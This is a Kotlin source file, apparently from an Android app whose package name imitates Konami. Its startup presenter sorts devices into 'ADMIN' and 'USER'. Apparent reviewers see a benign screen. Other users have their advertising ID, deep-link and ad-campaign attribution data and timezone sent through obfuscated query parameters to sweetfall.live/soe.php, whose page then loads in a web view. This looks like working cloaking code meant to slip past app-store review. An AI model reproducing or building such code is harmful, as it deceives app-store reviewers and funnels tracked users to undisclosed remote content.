package jp.konami.duell.presentation.starting

import android.annotation.SuppressLint
import android.content.Context
import android.net.Uri
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import com.palominolabs.http.url.UrlBuilder
import io.reactivex.Observable
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.rxkotlin.subscribeBy
import io.reactivex.schedulers.Schedulers
import jp.konami.duell.business.model.AppsModel
import jp.konami.duell.business.model.DeepModel
import jp.konami.duell.database.DatabaseModel
import jp.konami.duell.database.DatabaseStorage
import jp.konami.duell.navigation.Router
import jp.konami.duell.utils.SecurityState
import kotlinx.coroutines.launch
import moxy.InjectViewState
import moxy.MvpPresenter
import moxy.presenterScope
import java.util.*

@InjectViewState
class StartingPresenter(
    private val storage: DatabaseStorage,
    private val router: Router

) : MvpPresenter<StartingMvpView>() {

    override fun onFirstViewAttach() {
        presenterScope.launch {
            val recordsCount = storage.dao().count()
            if (recordsCount == 0) {
                viewState.startAdminService()
            } else {
                when (SecurityState.from(storage.dao().getAdmin())) {
                    SecurityState.ADMIN -> {
                        router.navigateToStars()
                    }
                    SecurityState.USER -> {
                        router.navigateToWeb(storage.dao().getUser())
                    }
                }
            }
        }
    }

    @SuppressLint("CheckResult")
    fun onSecurityStateReturned(state: SecurityState, activityContext: Context) {
        when (state) {
            SecurityState.ADMIN -> {
                presenterScope.launch {
                    storage.dao().insert(DatabaseModel(admin = true, user = ""))
                }
                router.navigateToStars()
            }
            SecurityState.USER -> {
                viewState.loadingStarted()
                getDeepObservable(activityContext).subscribeBy { deepModel ->
                    val ad =
                        AdvertisingIdClient.getAdvertisingIdInfo(activityContext).id.toString()
                    if (deepModel.data != null) {
                        OneSignal.initWithContext(activityContext)
                        OneSignal.setAppId("d547ce09-4e66-4c7b-837b-e2c4c12b9cc4")
                        OneSignal.setExternalUserId(ad)
                        OneSignal.sendTag("key2", deepModel.tag)

                        generate(
                            deep = deepModel.data,
                            uid = AppsFlyerLib.getInstance().getAppsFlyerUID(activityContext)
                                .toString(),
                            adId = ad
                        ).subscribeOn(Schedulers.io())
                            .observeOn(AndroidSchedulers.mainThread())
                            .subscribe { router.navigateToWeb(it) }
                    } else {
                        getAppsObservable(activityContext).subscribeBy { appsModel ->
                            OneSignal.initWithContext(activityContext)
                            OneSignal.setAppId("d547ce09-4e66-4c7b-837b-e2c4c12b9cc4")
                            OneSignal.setExternalUserId(ad)
                            OneSignal.sendTag("key2", appsModel.tag)

                            generate(
                                apps = appsModel.data,
                                uid = AppsFlyerLib.getInstance().getAppsFlyerUID(activityContext)
                                    .toString(),
                                adId = ad
                            ).subscribeOn(Schedulers.io())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe { router.navigateToWeb(it) }
                        }
                    }
                }
            }
        }
    }

    private fun getDeepObservable(context: Context): Observable<DeepModel> {
        return Observable.create { subscriber ->
            AppLinkData.fetchDeferredAppLinkData(context) { appLinkData ->
                val uri: Uri? = appLinkData?.targetUri
                //val uri = "myapp://test1/test2/test3"
                val tag = uri.toString().drop(8).substringBefore('/')
                subscriber.onNext(DeepModel(uri?.toString(), tag))
                subscriber.onComplete()
            }
        }
    }

    private fun getAppsObservable(context: Context): Observable<AppsModel> {
        return Observable.create { subscriber ->
            AppsFlyerLib.getInstance().init(
                "ocKVhBBNEG7ikDsertM2rU",
                object : AppsFlyerConversionListener {
                    override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
//                        val data = mutableMapOf<String, Any>(
//                            "campaign" to "test1_test2_test3_test4_test5"
//                        )
                        val tag: String =
                            if (data?.get("af_status").toString() == "Organic") "organic" else
                                data?.get("campaign").toString().substringBefore('_')
                        subscriber.onNext(AppsModel(data, tag))
                        subscriber.onComplete()
                    }

                    override fun onConversionDataFail(p0: String?) {
                        subscriber.onNext(AppsModel(null, "organic"))
                        subscriber.onComplete()
                    }

                    override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

                    }

                    override fun onAttributionFailure(p0: String?) {

                    }

                },
                context
            )
            AppsFlyerLib.getInstance().start(context)
        }
    }

    private fun generate(
        deep: String? = null,
        apps: MutableMap<String, Any>? = null,
        uid: String,
        adId: String
    ): Observable<String> {
        return Observable.create { subscriber ->
            val source: String = deep?.let { "deeplink" } ?: apps?.get("media_source").toString()
            subscriber.onNext(
                UrlBuilder.forHost("https", "sweetfall.live")
                    .pathSegment("soe.php")
                    .queryParam("1jD9pd86FK", "D4RnSHZlsq")
                    .queryParam("xzjg8K1WS5", TimeZone.getDefault().id)
                    .queryParam("gxCnvlLGHi", adId)
                    .queryParam("hzB9qzwKYa", deep.toString())
                    .queryParam("E4AhT69uu3", source)
                    .queryParam("DLrN1c27jt", if (deep != null) "null" else uid)
                    .queryParam("sHMzXyoPyE", apps?.get("adset_id").toString())
                    .queryParam("jDgLiBJKS2", apps?.get("campaign_id").toString())
                    .queryParam("Wm4maCyNxj", apps?.get("campaign").toString())
                    .queryParam("XUnRhU5OeN", apps?.get("adset").toString())
                    .queryParam("srqi5rjpLp", apps?.get("adgroup").toString())
                    .queryParam("HK0ksbUlTr", apps?.get("orig_cost").toString())
                    .queryParam("CUD8lxJri8", apps?.get("af_siteid").toString())
                    .toUrlString()
            )
            subscriber.onComplete()
        }
    }
}